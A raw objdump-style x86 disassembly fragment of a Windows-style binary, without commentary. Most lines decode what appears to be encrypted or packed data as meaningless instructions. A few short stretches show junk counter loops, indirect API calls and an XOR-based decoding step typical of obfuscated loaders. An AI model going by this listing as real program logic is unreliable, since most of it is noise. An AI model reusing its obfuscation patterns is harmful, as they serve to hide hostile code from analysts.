  40705a:	cwde   
  40705b:	push   ebp
  40705c:	nop
  40705d:	xor    al,BYTE PTR [eax]
  40705f:	ror    edx,0x90
  407062:	or     DWORD PTR [esi],0xe7c5eb29
  407068:	or     al,0xa0
  40706a:	push   edx
  40706b:	ret    0xb650
  40706e:	imul   ebx,DWORD PTR ss:[ebx-0x78],0x1f503411
  407076:	shr    DWORD PTR [edi-0x4d],0x9c
  40707a:	pop    edi
  40707b:	nop
  40707c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40707d:	sub    al,0x89
  40707f:	add    bh,BYTE PTR [ebx]
  407081:	fnstenv [edi-0x43]
  407084:	jge    0x407083
  407086:	into   
  407087:	inc    BYTE PTR [esi]
  407089:	ds xchg esp,eax
  40708b:	jge    0x4070cc
  40708d:	stos   DWORD PTR es:[edi],eax
  40708e:	aam    0x90
  407090:	pop    esp
  407091:	mov    ch,BYTE PTR [edi]
  407093:	jecxz  0x40709f
  407095:	ins    DWORD PTR es:[edi],dx
  407096:	aas    
  407097:	stc    
  407098:	inc    ebp
  407099:	mov    al,BYTE PTR ds:0xff8f4e9d
  40709f:	iret   
  4070a0:	pop    ebp
  4070a1:	cmp    BYTE PTR [ebp+0x448f184e],0xc3
  4070a8:	push   cs
  4070a9:	fsubp  st(1),st
  4070ab:	mov    dl,0xd3
  4070ad:	or     ebp,DWORD PTR [ebp+ecx*8+0x47]
  4070b1:	jo     0x407124
  4070b3:	add    eax,0x4f6c2978
  4070b8:	dec    esi
  4070b9:	rcl    BYTE PTR [ebx-0x2c],0x13
  4070bd:	push   ebx
  4070be:	and    eax,0x5f5a7855
  4070c3:	enter  0xb1cf,0x33
  4070c7:	dec    ebp
  4070c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4070c9:	xchg   edi,eax
  4070ca:	mov    dh,0x64
  4070cc:	cdq    
  4070cd:	test   DWORD PTR [ebx-0x1459b876],0xb9f08b71
  4070d7:	xor    eax,0x5bf23683
  4070dc:	das    
  4070dd:	mov    ebx,0x82b715a3
  4070e2:	call   FWORD PTR [esi]
  4070e4:	aaa    
  4070e5:	xchg   edx,eax
  4070e6:	push   es
  4070e7:	sbb    bh,BYTE PTR [ebx+ecx*4+0x1d798698]
  4070ee:	pop    ebp
  4070ef:	push   ds
  4070f0:	lds    esp,FWORD PTR [edi]
  4070f2:	int    0xbb
  4070f4:	mov    eax,ds:0x8b0fa969
  4070f9:	or     bl,BYTE PTR [eax-0x6d]
  4070fc:	add    esp,DWORD PTR [ecx+0x68]
  4070ff:	outs   dx,BYTE PTR ds:[esi]
  407100:	add    BYTE PTR [edx+ecx*1],dl
  407103:	sub    eax,DWORD PTR [ebp-0xb]
  407106:	or     al,0x5f
  407108:	xlat   BYTE PTR ds:[ebx]
  407109:	nop
  40710a:	cmp    edi,DWORD PTR [edx-0x2]
  40710d:	loope  0x407148
  40710f:	jns    0x407154
  407111:	sbb    DWORD PTR [ebx-0x47e65426],eax
  407117:	pop    es
  407118:	cdq    
  407119:	jecxz  0x40715b
  40711b:	and    DWORD PTR [ebx-0x48],ebx
  40711e:	(bad)  
  40711f:	in     al,0xfb
  407121:	push   ecx
  407122:	inc    ebp
  407123:	inc    edi
  407124:	pop    ecx
  407125:	je     0x407186
  407127:	xchg   edi,eax
  407128:	dec    edi
  407129:	(bad)  
  40712a:	sar    BYTE PTR ds:0xdaa32c9a,1
  407130:	scas   eax,DWORD PTR es:[edi]
  407131:	mov    dh,0x64
  407133:	or     dh,BYTE PTR [ecx]
  407135:	jo     0x40719b
  407137:	dec    esi
  407138:	adc    dl,BYTE PTR [edi+0x10f3c20f]
  40713e:	(bad)  
  407140:	cli    
  407141:	jb     0x407160
  407143:	pop    ds
  407144:	iret   
  407145:	sbb    DWORD PTR [ebp+0x43d60bc7],ecx
  40714b:	fcomp  st(5)
  40714d:	push   esp
  40714e:	in     eax,dx
  40714f:	icebp  
  407150:	iret   
  407151:	in     eax,dx
  407152:	sti    
  407153:	dec    eax
  407154:	pushf  
  407155:	xor    DWORD PTR [eax],ebp
  407157:	ffree  st(4)
  407159:	jo     0x4071c2
  40715b:	call   0xfd346686
  407160:	mov    esp,0x661b7123
  407165:	xchg   ebp,eax
  407166:	(bad)  
  407167:	lods   eax,DWORD PTR ds:[esi]
  407168:	vpsllq ymm4,ymm4,XMMWORD PTR [ecx-0x21bfd65b]
  407170:	rol    DWORD PTR ds:[esi+0x63],cl
  407174:	mov    eax,ds:0x81075fc8
  407179:	aam    0x7a
  40717b:	sbb    bl,BYTE PTR [ebx]
  40717d:	sub    DWORD PTR ds:[esi-0x727891e2],edi
  407184:	push   0x198f55c7
  407189:	push   es
  40718a:	xor    BYTE PTR [edx],dh
  40718c:	push   edx
  40718d:	out    dx,eax
  40718e:	pop    es
  40718f:	inc    esi
  407190:	test   eax,0xabd21a05
  407195:	dec    esp
  407196:	push   ss
  407197:	dec    edx
  407198:	aad    0xcb
  40719a:	push   0x4817c46
  40719f:	int3   
  4071a0:	pop    edx
  4071a1:	jae    0x4071ad
  4071a3:	mov    al,ds:0x2272279e
  4071a8:	sbb    eax,0xd9e6d380
  4071ad:	addr16 jnp 0x4071b5
  4071b0:	jne    0x40715c
  4071b2:	pop    esi
  4071b3:	daa    
  4071b4:	jae    0x407211
  4071b6:	push   edi
  4071b7:	mov    esp,0xa5f516d7
  4071bc:	cdq    
  4071bd:	repz xchg ebx,eax
  4071bf:	inc    esp
  4071c0:	lods   al,BYTE PTR ds:[esi]
  4071c1:	add    al,0x9
  4071c3:	adc    ecx,DWORD PTR [edi+ecx*8]
  4071c6:	sbb    eax,0x3986dbc
  4071cb:	or     eax,0x9164fee6
  4071d0:	mov    bl,0x68
  4071d2:	rol    ebx,1
  4071d4:	add    al,0x50
  4071d6:	pop    eax
  4071d7:	xchg   edx,eax
  4071d8:	dec    ebp
  4071d9:	lods   eax,DWORD PTR ds:[esi]
  4071da:	jno    0x40719a
  4071dc:	aas    
  4071dd:	xor    DWORD PTR [edi],esp
  4071df:	ds adc eax,0xc6b7bd37
  4071e5:	push   edx
  4071e6:	dec    edi
  4071e7:	jae    0x407216
  4071e9:	push   eax
  4071ea:	or     DWORD PTR [edx-0x782af602],edi
  4071f0:	lock outs dx,DWORD PTR ds:[esi]
  4071f3:	adc    DWORD PTR [ecx+edi*1-0x3b6dd010],0xb
  4071fb:	data16 jo 0x407256
  4071fe:	sub    bh,BYTE PTR [edi]
  407200:	mov    eax,0x63ddb934
  407205:	fs push esp
  407207:	mov    ds:0x59a4047d,eax
  40720c:	pop    edx
  40720d:	and    DWORD PTR ds:[esi-0x42],ebx
  407211:	repnz rcl DWORD PTR [ebx-0x53de461f],0x61
  407219:	stos   DWORD PTR es:[edi],eax
  40721a:	aam    0x25
  40721c:	push   esp
  40721d:	pop    edx
  40721e:	cmp    BYTE PTR [edi-0x3d],al
  407221:	fidivr WORD PTR [eax+0x7d]
  407224:	cmp    al,0x53
  407226:	mov    WORD PTR ds:0x892d831d,ss
  40722c:	test   BYTE PTR ss:[edi],0x60
  407230:	and    DWORD PTR [eax+0xdaf51ce],edi
  407236:	jmp    0x8b97430e
  40723b:	cld    
  40723c:	or     ecx,ebx
  40723e:	jnp    0x4071c9
  407240:	data16 ins BYTE PTR es:[edi],dx
  407242:	cmp    ch,BYTE PTR [esi+0x3f]
  407245:	popf   
  407246:	out    dx,eax
  407247:	cmp    al,0x7f
  407249:	sbb    BYTE PTR [esi-0x21],0xed
  40724d:	or     BYTE PTR [edx+0x618ed49c],ah
  407253:	jb     0x40723d
  407255:	cmp    ebp,ebx
  407257:	pusha  
  407258:	outs   dx,BYTE PTR ds:[esi]
  407259:	fist   WORD PTR [edi+edx*1]
  40725c:	(bad)  
  40725d:	(bad)  
  40725f:	add    ebx,DWORD PTR [ebx+0x4]
  407262:	clc    
  407263:	add    eax,0x1955e5b2
  407268:	inc    esp
  407269:	jge    0x407260
  40726b:	addr16 inc ebp
  40726d:	inc    edx
  40726e:	aad    0x34
  407270:	mov    ch,0x7a
  407272:	lea    ecx,[esi]
  407274:	add    eax,0x737f2dfa
  407279:	das    
  40727a:	out    dx,eax
  40727b:	out    dx,eax
  40727c:	in     al,0x67
  40727e:	idiv   BYTE PTR [ebx+0x2d9eca16]
  407284:	jno    0x407232
  407286:	lods   al,BYTE PTR ds:[esi]
  407287:	mov    ecx,eax
  407289:	jp     0x4072f1
  40728b:	push   0xa3bda615
  407290:	nop
  407291:	loopne 0x4072bf
  407293:	sbb    al,0xaa
  407295:	fs iret 
  407297:	mov    ah,dl
  407299:	mov    edi,0x5cfd0bad
  40729e:	mov    esp,0x1f43baba
  4072a3:	scas   al,BYTE PTR es:[edi]
  4072a4:	push   eax
  4072a5:	repnz in al,0x94
  4072a8:	(bad)  
  4072a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4072aa:	adc    al,0x6e
  4072ac:	sbb    ah,ch
  4072ae:	loop   0x40730a
  4072b0:	jmp    0xefed:0x70e655b5
  4072b7:	mov    dh,0x8f
  4072b9:	mov    edi,0xfbb6d20
  4072be:	mov    cl,0x2a
  4072c0:	inc    esi
  4072c1:	test   BYTE PTR [edx+0x64cfc221],cl
  4072c7:	mov    edi,0x5946d09b
  4072cc:	ror    BYTE PTR [eax+0x54],1
  4072cf:	sti    
  4072d0:	inc    esi
  4072d1:	push   es
  4072d2:	jle    0x407345
  4072d4:	mov    dl,0x89
  4072d6:	sub    bh,dh
  4072d8:	inc    esi
  4072d9:	xadd   ch,cl
  4072dc:	xor    eax,0x576d9dd4
  4072e1:	add    al,0xaa
  4072e3:	aaa    
  4072e4:	pop    esp
  4072e5:	daa    
  4072e6:	jnp    0x4072ba
  4072e8:	xor    DWORD PTR [eax],edi
  4072ea:	mov    ebx,DWORD PTR [ebx+ebx*1-0x35]
  4072ee:	test   BYTE PTR ds:0x8da6c0e0,0x8a
  4072f5:	inc    ebx
  4072f6:	repnz adc esi,DWORD PTR [ebx]
  4072f9:	push   0x70
  4072fb:	sar    BYTE PTR [edi],1
  4072fd:	sub    ah,ah
  4072ff:	mov    dh,0xb3
  407301:	sbb    DWORD PTR [edx+0x52a6dbda],esp
  407307:	pop    ds
  407308:	sub    eax,DWORD PTR [edx+0xdf07bda]
  40730e:	ds clc 
  407310:	test   al,0xfb
  407312:	xor    edi,ecx
  407314:	mov    ds:0x4b7f80ad,al
  407319:	xchg   ebp,eax
  40731a:	mov    edi,0xd5f59eb0
  40731f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407320:	push   0x45c60391
  407325:	(bad)  
  407326:	jg     0x4072b5
  407328:	inc    ebp
  407329:	inc    DWORD PTR [ecx+0x42a79925]
  40732f:	add    BYTE PTR [eax],al
  407331:	add    BYTE PTR [eax],al
  407333:	add    cl,ch
  407335:	or     eax,0x8b000000
  40733a:	or     eax,0x42a799
  40733f:	inc    ecx
  407340:	mov    DWORD PTR ds:0x42a799,ecx
  407346:	cmp    DWORD PTR ds:0x42a799,0x14
  40734d:	jae    0x4076a2
  407353:	cmp    DWORD PTR ds:0x42a799,0x4
  40735a:	jne    0x407378
  407360:	push   0x42a8a9
  407365:	push   0x360b
  40736a:	push   DWORD PTR [ebp-0x20]
  40736d:	push   0x8b40
  407372:	call   DWORD PTR ds:0x41d194
  407378:	cmp    DWORD PTR ds:0x42a799,0x3
  40737f:	jne    0x407394
  407385:	xor    ecx,ecx
  407387:	xor    ecx,DWORD PTR ds:0x42a799
  40738d:	inc    ecx
  40738e:	mov    DWORD PTR ds:0x42a799,ecx
  407394:	jmp    0x407339
  407399:	jmp    0x4076a2
  40739e:	iret   
  40739f:	retf   0xced7
  4073a2:	(bad)  
  4073a4:	aad    0xc9
  4073a6:	in     eax,0x5e
  4073a8:	mov    DWORD PTR ds:0x9daa7298,esp
  4073ae:	inc    esp
  4073af:	sar    DWORD PTR [eax+0x78],1
  4073b2:	fs jle 0x40742d
  4073b5:	js     0x4073b6
  4073b7:	lahf   
  4073b8:	and    BYTE PTR [ebx-0x3f47c9dd],ch
  4073be:	scas   eax,DWORD PTR es:[edi]
  4073bf:	sub    al,0xbd
  4073c1:	icebp  
  4073c2:	nop
  4073c3:	icebp  
  4073c4:	call   FWORD PTR ss:[edi+0x17c487f6]
  4073cb:	iret   
  4073cc:	ret    0xc21c
  4073cf:	fs clc 
  4073d1:	(bad)  
  4073d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073d3:	imul   eax,edi,0xffffffb4
  4073d6:	xor    eax,0x98ba30ef
  4073db:	add    al,0x96
  4073dd:	mov    WORD PTR [edi-0x56],ss
  4073e0:	iret   
  4073e1:	and    al,0xee
  4073e3:	mov    bl,0xd0
  4073e5:	dec    ecx
  4073e6:	fistp  DWORD PTR [ecx+0x5a]
  4073e9:	xchg   ebp,eax
  4073ea:	push   ebx
  4073eb:	jb     0x40740b
  4073ed:	xor    al,0xb6
  4073ef:	in     al,dx
  4073f0:	mov    ch,0x24
  4073f2:	loopne 0x40746f
  4073f4:	push   ebx
  4073f5:	lea    edx,[edi-0x4b]
  4073f8:	mov    ebp,0x46128279
  4073fd:	mov    al,0x95
  4073ff:	scas   eax,DWORD PTR es:[edi]
  407400:	xchg   DWORD PTR [ebx+ebp*1+0x51f3e610],eax
  407407:	add    esi,DWORD PTR [edi-0x70f2c962]
  40740d:	fisubr WORD PTR [ebp-0x59]
  407410:	enter  0xb4f7,0xe9
  407414:	sub    esp,eax
  407416:	test   ebp,ecx
  407418:	popa   
  407419:	(bad)  
  40741a:	(bad)  
  40741b:	loopne 0x407464
  40741d:	lea    edi,cs:[edx-0x6b964e71]
  407424:	push   eax
  407425:	fnstcw WORD PTR [ebx]
  407427:	shl    DWORD PTR [edi-0x1121b6dc],cl
  40742d:	gs inc edx
  40742f:	xor    ch,bh
  407431:	popa   
  407432:	sub    ebx,DWORD PTR [ecx-0x7158c031]
  407438:	xchg   edx,ebp
  40743a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40743b:	jb     0x4073ef
  40743d:	jbe    0x407485
  40743f:	and    BYTE PTR [edx],bl
  407441:	and    al,dl
  407443:	push   edi
  407444:	add    al,0xec
  407446:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407447:	scas   eax,DWORD PTR es:[edi]
  407448:	sub    eax,0x1a88d337
  40744d:	popa   
  40744e:	mov    eax,ds:0x449d48ed
  407453:	dec    ebp
  407454:	inc    ecx
  407455:	sbb    al,0xdd
  407457:	and    al,0xb5
  407459:	rol    bh,0x70
  40745c:	dec    ebx
  40745d:	imul   edx,DWORD PTR [esi+eax*8-0x363d67e2],0x33
  407465:	push   eax
  407466:	xchg   ecx,eax
  407467:	rcr    ch,cl
  407469:	inc    esp
  40746a:	mov    eax,ds:0x86703dc9
  407470:	inc    ecx
  407471:	adc    DWORD PTR [ecx],ecx
  407473:	mov    eax,0x390c852b
  407478:	mov    ebp,0x87e0479f
  40747d:	stos   DWORD PTR es:[edi],eax
  40747e:	sbb    eax,0xbce89f15
  407483:	int3   
  407484:	test   BYTE PTR [edi],bh
  407486:	cmc    
  407487:	nop
  407488:	iret   
  407489:	lds    ebx,FWORD PTR [ecx-0x4f1291f8]
  40748f:	lods   al,BYTE PTR ds:[esi]
  407490:	push   esp
  407491:	inc    edx
  407492:	jecxz  0x4074d8
  407494:	sub    DWORD PTR [ebx],ecx
  407496:	aad    0xa1
  407498:	mov    ds:0xc1c1aec5,al
  40749d:	and    bl,BYTE PTR [esi+0x7e]
  4074a0:	hlt    
  4074a1:	or     ah,BYTE PTR [edi+0x28]
  4074a4:	jmp    0x8e61f288
  4074a9:	ja     0x4074c3
  4074ab:	or     ecx,DWORD PTR ds:0x8cbad1da
  4074b1:	xchg   ecx,eax
  4074b2:	lahf   
  4074b3:	loope  0x4074a4
  4074b5:	dec    eax
  4074b6:	or     ch,dh
  4074b8:	mov    ds:0x3d177ee8,al
  4074bd:	aad    0xbb
  4074bf:	push   es
  4074c0:	in     al,0xe9
  4074c2:	rcr    DWORD PTR [ebx+0x3d62a7ce],cl
  4074c8:	loop   0x407452
  4074ca:	retf   
  4074cb:	iret   
  4074cc:	pop    esp
  4074cd:	push   cs
  4074ce:	pusha  
  4074cf:	leave  
  4074d0:	xor    edx,DWORD PTR [ecx-0x11e28112]
  4074d6:	pushf  
  4074d7:	dec    eax
  4074d8:	jnp    0x407519
  4074da:	mov    esi,0xe9201f1a
  4074df:	out    0x8f,al
  4074e1:	add    BYTE PTR [ecx-0x4f],al
  4074e4:	push   esi
  4074e5:	mov    eax,ds:0xc0a41d73
  4074ea:	sbb    DWORD PTR [edx],0x52
  4074ed:	in     eax,dx
  4074ee:	into   
  4074ef:	ret    0xbb41
  4074f2:	pop    esp
  4074f3:	pop    ebx
  4074f4:	dec    esp
  4074f5:	jmp    0x913f:0x65eb16f1
  4074fc:	int    0x1a
  4074fe:	push   edx
  4074ff:	sbb    eax,0x9b125ab
  407504:	in     eax,dx
  407505:	mov    edx,gs
  407507:	int    0x6b
  407509:	mov    al,bl
  40750b:	ds repz jno 0x407557
  40750f:	push   es
  407510:	jns    0x407589
  407512:	in     eax,0xcf
  407514:	mov    al,ds:0x139a4228
  407519:	cmc    
  40751a:	addr16 adc eax,0x998580a4
  407520:	dec    ebx
  407521:	and    DWORD PTR [ebx],ecx
  407523:	jmp    0xdd01:0xcea50d75
  40752a:	add    DWORD PTR [ebp+0x352003ae],eax
  407530:	pop    edx
  407531:	hlt    
  407532:	das    
  407533:	jae    0x4074f7
  407535:	inc    edi
  407536:	and    eax,0x5dac7be4
  40753b:	(bad)  
  40753d:	cdq    
  40753e:	dec    edx
  40753f:	popa   
  407540:	push   ebp
  407541:	jp     0x4074d6
  407543:	and    DWORD PTR [ebx],ebx
  407545:	retf   
  407546:	fisttp QWORD PTR [edx]
  407548:	outs   dx,BYTE PTR ds:[esi]
  407549:	push   edi
  40754a:	jg     0x4075aa
  40754c:	push   ebx
  40754d:	and    eax,0xa8110b6b
  407552:	ds dec ecx
  407554:	adc    edi,DWORD PTR [edx]
  407556:	mov    BYTE PTR [edi],dh
  407558:	mov    esi,DWORD PTR [edx+eax*8+0x4f65c07d]
  40755f:	dec    esp
  407560:	push   ss
  407561:	push   0xf6b38ec5
  407566:	mov    BYTE PTR [ecx+ebp*2],bh
  407569:	cli    
  40756a:	pushf  
  40756b:	mov    WORD PTR [edx],es
  40756d:	aas    
  40756e:	ret    0x3051
  407571:	mov    WORD PTR [edi-0x56e1f4c3],es
  407577:	imul   esi,DWORD PTR [ecx+0x530180bf],0x156849b3
  407581:	xor    ecx,DWORD PTR [eax-0x26]
  407584:	jecxz  0x407579
  407586:	aad    0x40
  407588:	mov    eax,0x92e24b37
  40758d:	add    eax,0xd683eb56
  407592:	xchg   BYTE PTR [ebp-0x60],ch
  407595:	and    BYTE PTR [edi-0x55316352],0x82
  40759c:	mov    dl,0x8f
  40759e:	mov    esp,0x31117d13
  4075a3:	fmul   DWORD PTR [esi+ebp*8]
  4075a6:	ins    BYTE PTR es:[edi],dx
  4075a7:	mov    ebp,0xa5a66e09
  4075ac:	xor    ch,BYTE PTR [edx-0x76]
  4075af:	mov    DWORD PTR [edi+edx*1],0x314432b5
  4075b6:	jns    0x407555
  4075b8:	pop    ebp
  4075b9:	leave  
  4075ba:	jns    0x407564
  4075bc:	adc    al,0x9b
  4075be:	add    ebp,DWORD PTR [edx-0x7a2cfcb5]
  4075c4:	xor    dl,BYTE PTR [esi+ecx*4]
  4075c7:	pop    ds
  4075c8:	dec    ebx
  4075c9:	aas    
  4075ca:	cmp    ebx,ecx
  4075cc:	dec    ecx
  4075cd:	lea    ebx,ds:0xb794bc3d
  4075d3:	mov    eax,0x5955610
  4075d8:	arpl   WORD PTR [edi+0x7f],bp
  4075db:	inc    ecx
  4075dc:	adc    dh,0xd2
  4075df:	mov    ebx,0x7f62ae74
  4075e4:	mov    ebp,0x2a29d25c
  4075e9:	inc    ebp
  4075ea:	adc    eax,0xf2bfab36
  4075ef:	mov    ah,0xc1
  4075f1:	dec    edx
  4075f2:	inc    esp
  4075f3:	cmp    DWORD PTR [ebp+0x77],edi
  4075f6:	xchg   esi,eax
  4075f7:	les    edx,FWORD PTR [edx]
  4075f9:	stos   BYTE PTR es:[edi],al
  4075fa:	push   0xffffffe8
  4075fc:	jno    0x407656
  4075fe:	jl     0x4075dd
  407600:	les    ebx,FWORD PTR [ebp-0x5a005506]
  407606:	ficomp DWORD PTR [esp+edx*4-0x31]
  40760a:	retf   0xbb73
  40760d:	cmp    esp,ecx
  40760f:	jle    0x407655
  407611:	pushf  
  407612:	jnp    0x4075fe
  407614:	gs psubw mm6,mm7
  407618:	popf   
  407619:	and    bh,BYTE PTR [ebp-0x17]
  40761c:	stc    
  40761d:	mov    WORD PTR [edx-0xfacc98b],?
  407623:	std    
  407624:	in     eax,dx
  407625:	add    ah,bh
  407627:	ss ret 
  407629:	bound  ecx,QWORD PTR [ecx]
  40762b:	stos   BYTE PTR es:[edi],al
  40762c:	jbe    0x4075f4
  40762e:	sub    al,dl
  407630:	into   
  407631:	fild   WORD PTR [ebx-0x3a]
  407634:	xor    eax,0x6d7a8751
  407639:	fld    QWORD PTR [edx+ebp*2+0x41fc5f8d]
  407640:	cmp    edi,DWORD PTR [edi+ecx*2-0x5f]
  407644:	sub    eax,0xd388b71
  407649:	sub    BYTE PTR [edx],cl
  40764b:	pop    ecx
  40764c:	add    eax,0x9be30dcb
  407651:	les    edi,FWORD PTR [eax-0x6e]
  407654:	mov    ebp,ebp
  407656:	fild   DWORD PTR [ecx+0x7d]
  407659:	push   0x23d01b25
  40765e:	in     eax,dx
  40765f:	mov    ebp,0xc594bbfa
  407664:	not    bh
  407666:	out    0x83,al
  407668:	aad    0x28
  40766a:	or     eax,0x182d081a
  40766f:	inc    ebp
  407670:	pop    edx
  407671:	mov    gs,WORD PTR [ebx-0x65]
  407674:	(bad)  
  407675:	imul   esi,DWORD PTR [edi+0x59],0x6a
  407679:	data16 jg 0x4076aa
  40767c:	push   cs
  40767d:	mov    esi,ebp
  40767f:	es mov ebx,0xfa8f327d
  407685:	sets   BYTE PTR [esi+0x40]
  407689:	mul    esi
  40768b:	(bad)  [esi+eiz*8+0x14220776]
  407692:	data16 out dx,al
  407694:	mov    ss,WORD PTR [ecx]
  407696:	xor    cl,BYTE PTR [ebx+0x62901a52]
  40769c:	pop    ss
  40769d:	push   edi
  40769e:	fwait
  40769f:	enter  0x30f3,0x89
  4076a3:	inc    ebp
  4076a4:	lock mov al,BYTE PTR [ebp-0x1]
  4076a8:	or     DWORD PTR ds:0x42a781,0x6cf8
  4076b2:	mov    ecx,DWORD PTR [ebp-0x10]
  4076b5:	xor    al,0x43
  4076b7:	sub    al,0x3b
  4076b9:	sbb    DWORD PTR ds:0x42a85d,0x42a79d
  4076c3:	mov    BYTE PTR [ecx],al
  4076c5:	mov    DWORD PTR [ebp-0x8],0xf89c8538
  4076cc:	and    DWORD PTR ds:0x42a7d9,0x0
  4076d6:	jmp    0x4076e8
  4076db:	mov    ecx,DWORD PTR ds:0x42a7d9
  4076e1:	inc    ecx
  4076e2:	mov    DWORD PTR ds:0x42a7d9,ecx
  4076e8:	cmp    DWORD PTR ds:0x42a7d9,0x12
  4076ef:	jae    0x40772f
  4076f5:	cmp    DWORD PTR ds:0x42a7d9,0xa
  4076fc:	jne    0x407710
  407702:	push   DWORD PTR [ebp-0xc]
  407705:	push   0x84c8
  40770a:	call   DWORD PTR ds:0x41d0c4
  407710:	cmp    DWORD PTR ds:0x42a7d9,0x9
  407717:	jne    0x40772a
  40771d:	mov    ecx,DWORD PTR ds:0x42a7d9
  407723:	inc    ecx
  407724:	mov    DWORD PTR ds:0x42a7d9,ecx
  40772a:	jmp    0x4076db
  40772f:	mov    DWORD PTR [ebp-0x10],0xf89c8539
  407736:	mov    eax,DWORD PTR [ebp-0x8]
  407739:	mov    ecx,0x7510850
  40773e:	push   esi
  40773f:	xor    eax,ecx
  407741:	mov    esi,0x327298
  407746:	add    eax,esi
  407748:	jmp    0x407755
  40774d:	mov    dl,BYTE PTR [ebp-0x1]
  407750:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  407754:	inc    eax
  407755:	cmp    eax,0x40
  407758:	jb     0x40774d
  40775e:	mov    edx,DWORD PTR [ebp-0x8]
  407761:	mov    eax,DWORD PTR [ebp-0xc]
  407764:	xor    edx,ecx
  407766:	add    edx,esi
  407768:	cmp    edx,eax
  40776a:	je     0x407dc2
  407770:	push   ebx
  407771:	push   edi
  407772:	mov    edi,DWORD PTR [ebp+0x8]
  407775:	mov    eax,0x8a36
  40777a:	xor    ax,WORD PTR [edi+edx*4+0x2]
  40777f:	mov    edi,0x3afc
  407784:	jmp    0x407a8d
  407789:	cmp    al,0xc2
  40778b:	cmp    al,0xd3
  40778d:	ret    0xd3d1
  407790:	shl    DWORD PTR [edx-0x24518918],1
  407796:	js     0x40777a
  407798:	mov    ch,0xb0
  40779a:	(bad)  
  40779b:	js     0x407815
  40779d:	fs jle 0x407818
  4077a0:	js     0x4077d5
  4077a2:	mov    ebx,ds
  4077a4:	(bad)  
  4077a6:	and    BYTE PTR [ebx],0x15
  4077a9:	icebp  
  4077aa:	jle    0x4077c0
  4077ac:	sbb    DWORD PTR [ecx],ebx
  4077ae:	pop    esi
  4077af:	jmp    0xa86e:0xdf90ef97
  4077b6:	fwait
  4077b7:	in     al,dx
  4077b8:	and    DWORD PTR [edx-0x393e43de],ebx
  4077be:	ins    BYTE PTR es:[edi],dx
  4077bf:	aaa    
  4077c0:	jnp    0x407773
  4077c2:	sub    al,0xae
  4077c4:	pop    es
  4077c5:	sbb    eax,0x47aafe4f
  4077ca:	xlat   BYTE PTR ds:[ebx]
  4077cb:	sub    eax,0xe26f6404
  4077d0:	jle    0x4077db
  4077d2:	stos   BYTE PTR es:[edi],al
  4077d3:	add    ah,BYTE PTR [ebp-0x433a01bd]
  4077d9:	and    DWORD PTR [ebx-0x35],0x7471d654
  4077e0:	sub    BYTE PTR [ebp+0x1aa58106],ch
  4077e6:	mov    ebx,0x11df1f2e
  4077eb:	ss lahf 
  4077ed:	jle    0x407820
  4077ef:	mov    ds:0x828a23c3,eax
  4077f4:	inc    esp
  4077f5:	repnz pop edi
  4077f7:	nop
  4077f8:	jmp    0x4077f5
  4077fa:	fistp  WORD PTR [eax]
  4077fc:	sub    edx,DWORD PTR [eax-0x7b768e5]
  407802:	xchg   DWORD PTR [ebp+eiz*2+0x3d86e976],edx
  407809:	je     0x407859
  40780b:	jecxz  0x407802
  40780d:	fstp   DWORD PTR [ebx]
  40780f:	dec    BYTE PTR [eax-0x51a66cb9]
  407815:	gs dec esp
  407817:	aaa    
  407818:	shl    eax,cl
  40781a:	xlat   BYTE PTR ds:[ebx]
  40781b:	ins    BYTE PTR es:[edi],dx
  40781c:	add    DWORD PTR [edi],esi
  40781e:	int    0x5d
  407820:	inc    ebp
  407821:	jnp    0x40788a
  407823:	ins    DWORD PTR es:[edi],dx
  407824:	loop   0x40780a
  407826:	imul   DWORD PTR [ecx+0x11]
  407829:	std    
  40782a:	push   edx
  40782b:	dec    ebx
  40782c:	mov    al,ds:0x71161f43
  407831:	mov    ah,0xb4
  407833:	mov    dl,0x86
  407835:	(bad)  
  407836:	shl    BYTE PTR ds:0x933782e9,cl
  40783c:	ffree  st(5)
  40783e:	xor    cl,BYTE PTR [esi-0x23]
  407841:	fisttp WORD PTR [esi+0x64795a8f]
  407847:	scas   eax,DWORD PTR es:[edi]
  407848:	daa    
  407849:	ret    0x2b52
  40784c:	aad    0x69
  40784e:	shl    DWORD PTR [esi+0x74],1
  407851:	jnp    0x407821
  407853:	and    esp,esp
  407855:	cmp    al,0x6c
  407857:	add    al,0x38
  407859:	and    DWORD PTR [ecx],esi
  40785b:	pop    ss
  40785c:	and    esp,ecx
  40785e:	mov    cl,BYTE PTR [ebx-0x2]
  407861:	mov    DWORD PTR [edi+0x723e9dd4],ebx
  407867:	shl    DWORD PTR [ecx+0x46030840],cl
  40786d:	pop    esi
  40786e:	push   ebx
  40786f:	mov    ah,BYTE PTR [esi-0x76fc6eee]
  407875:	xchg   BYTE PTR [ebx],dl
  407877:	stos   DWORD PTR es:[edi],eax
  407878:	push   es
  407879:	jl     0x407829
  40787b:	lock into 
  40787d:	pop    ss
  40787e:	mov    ds:0x80de422a,eax
  407883:	aam    0x55
  407885:	das    
  407886:	mov    edx,0x5da000ac
  40788b:	js     0x407829
  40788d:	rol    DWORD PTR [ecx-0x366bb5fb],0x3d
  407894:	fstp   TBYTE PTR [ecx]
  407896:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407897:	dec    edx
  407898:	test   al,0xd9
  40789a:	or     BYTE PTR [edi+0x4bbe691c],ch
  4078a0:	and    al,0x82
  4078a2:	mov    dl,0x65
  4078a4:	cmp    eax,0xba850817
  4078a9:	or     eax,DWORD PTR [ebx+eiz*4]
  4078ac:	pusha  
  4078ad:	test   DWORD PTR ds:0x89910050,esi
  4078b3:	xchg   edi,eax
  4078b4:	push   0x7d6553aa
  4078b9:	retf   
  4078ba:	adc    DWORD PTR [ecx-0x5f],esi
  4078bd:	sahf   
  4078be:	adc    BYTE PTR [esi+0x59afd7c6],ah
  4078c4:	sub    BYTE PTR [esp+ebp*8-0x264a8f5f],ch
  4078cb:	jmp    0xb508a577
  4078d0:	sub    al,bh
  4078d2:	dec    ebx
  4078d3:	dec    edx
  4078d4:	and    edi,ebp
  4078d6:	jno    0x407901
  4078d8:	arpl   bp,cx
  4078da:	lahf   
  4078db:	mov    WORD PTR [esi+ebx*8+0xb],?
  4078df:	and    DWORD PTR [ebp-0xf],esp
